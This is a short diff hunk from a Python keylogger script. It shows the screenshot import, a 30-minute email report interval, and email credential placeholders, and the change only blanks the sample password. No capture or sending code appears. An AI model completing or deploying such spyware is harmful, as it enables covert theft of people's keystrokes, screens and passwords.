@@ -12,7 +12,7 @@ import pyscreenshot as ImageGrab #for screenshot
 
 SEND_REPORT_EVERY = 1800  # 30 minutes
 EMAIL_ADDRESS = " " #Enter Email
-EMAIL_PASSWORD = "password" # Enter Password
+EMAIL_PASSWORD = " " # Enter Password
 
 class Keylogger:
     def __init__(self, interval):
